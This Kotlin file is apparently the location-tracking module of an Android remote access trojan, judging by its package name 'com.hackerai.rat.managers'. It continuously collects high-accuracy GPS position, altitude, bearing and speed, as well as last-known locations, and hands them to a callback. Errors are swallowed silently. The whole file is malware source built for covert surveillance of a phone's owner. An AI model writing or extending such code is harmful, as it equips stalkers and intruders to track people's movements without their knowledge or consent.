package com.hackerai.rat.managers

import android.content.Context
import android.location.Location
import com.google.android.gms.location.*
import com.hackerai.rat.Config
import kotlinx.coroutines.*

class LocationManager(private val context: Context) {
    private var fusedClient: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null
    private var isTracking = false
    private var onLocation: ((Double, Double, Float, Double, Float, Float) -> Unit)? = null

    fun startTracking(callback: (Double, Double, Float, Double, Float, Float) -> Unit) {
        onLocation = callback
        isTracking = true
        fusedClient = LocationServices.getFusedLocationProviderClient(context)
        
        val request = LocationRequest.Builder(Config.LOCATION_INTERVAL)
            .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
            .setMinUpdateIntervalMillis(2000)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                if (!isTracking) return
                result.locations.forEach { loc ->
                    callback(
                        loc.latitude, loc.longitude,
                        loc.accuracy, loc.altitude,
                        loc.bearing, loc.speed
                    )
                }
            }
        }

        try {
            fusedClient?.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
        } catch (e: Exception) {}
    }

    fun stopTracking() {
        isTracking = false
        fusedClient?.removeLocationUpdates(locationCallback!!)
        locationCallback = null
        onLocation = null
    }

    fun getOneShot(callback: (Double, Double, Float, Double, Float, Float) -> Unit) {
        fusedClient = LocationServices.getFusedLocationProviderClient(context)
        try {
            fusedClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                if (loc != null) {
                    callback(loc.latitude, loc.longitude, loc.accuracy, loc.altitude, loc.bearing, loc.speed)
                }
            }
        } catch (e: Exception) {}
    }
}
